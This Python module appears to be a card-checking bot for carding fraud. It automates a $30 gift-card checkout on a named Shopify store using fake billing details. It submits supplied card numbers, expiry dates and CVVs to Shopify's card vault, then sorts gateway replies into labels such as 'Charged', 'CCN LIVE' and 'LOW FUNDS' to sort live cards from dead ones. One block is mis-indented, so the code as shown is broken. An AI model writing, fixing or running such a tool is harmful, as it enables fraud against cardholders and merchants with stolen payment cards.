from .rand_user import random_user_api


def sho_one(requests):
    cookie = requests.get('https://thursdayboots.com/products/gift-cards')
    x = random_user_api.find_between(cookie.text,'variantId":',',')
    return False if not x else x


def sho_two(requests, x) -> bool:
    json_one = {
    "id": x,
    "quantity": 1,
    "properties": {}
}

    one = requests.post('https://thursdayboots.com/cart/add.js', data= json_one)
    if 'id' in one.json(): return True
    else: return False



def sho_three(requests, authenticity_token):
    two = requests.get('https://thursdayboots.com/checkout')
    url = two.url
    if not url: return False
        json_three = {
    '_method': 'patch',
    'authenticity_token': authenticity_token,
    'previous_step': 'contact_information',
    'step': 'payment_method',
    'checkout[email]': 'roldexstartgh@metalunits.com',
    'checkout[billing_address][first_name]': 'martin',
    'checkout[billing_address][last_name]': 'York',
    'checkout[billing_address][address1]': '3 allen street',
    'checkout[billing_address][address2]': '',
    'checkout[billing_address][city]': 'New York',
    'checkout[billing_address][country]': 'US',
    'checkout[billing_address][province]': 'New York',
    'checkout[billing_address][zip]': '10002',
    'checkout[billing_address][phone]': '+1 02259383093',
    'checkout[billing_address][first_name]': 'martin',
    'checkout[billing_address][last_name]': 'York',
    'checkout[billing_address][address1]': '3 allen street',
    'checkout[billing_address][address2]': '',
    'checkout[billing_address][city]': 'New York',
    'checkout[billing_address][country]': 'United States',
    'checkout[billing_address][province]': 'NY',
    'checkout[billing_address][zip]': '10002',
    'checkout[billing_address][phone]': '2259383093',
    'checkout[remember_me]': '',
    'checkout[remember_me]': '0',
    'checkout[client_details][browser_width]': '674',
    'checkout[client_details][browser_height]': '667',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '-330',
    'button': '',
    }

    three = requests.post(url, data = json_three)
    return False if three.status_code != 200 else url


def sho_four(requests, cc, mes, ano, cvv, random_user):
    json_four = {
    "credit_card": {
        "number": cc,
        "name": random_user.name,
        "month": mes,
        "year": ano,
        "verification_value": cvv
    },
    "payment_session_scope": "thursdayboots.com"
}

    four = requests.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return False
    return four.json()['id']





def sho_last(requests, url, authenticity_token, token):
    data_5 = {
'_method': 'patch',
'authenticity_token': authenticity_token,
'previous_step': 'payment_method',
'step': '',
's': token,
'checkout[payment_gateway]': '28297953370',
'checkout[credit_card][vault]': 'false',
'checkout[total_price]': '3000',
'complete': '1',
'checkout[client_details][browser_width]': '691',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}

    five = requests.post(url, data = data_5)
    processing_url = five.url

    six = requests.get(processing_url + '?from_processing_page=1')
    print(six.url)
    # six = requests.get(six.url)
    # print(six.url)
    return six.text




def get_response_sho_br(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $30", "✅", 'Charged'
        return r_text, r_logo, r_respo,
    text1 = random_user_api.find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if "2038" in text or "2046" in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    elif "2005" in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'Rejected'
    elif "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif "2010" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif "2015" in text or "2023" in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'Rejected'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'Rejected'
    elif "2004" in  text or "2006" in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'Rejected'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $30", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo
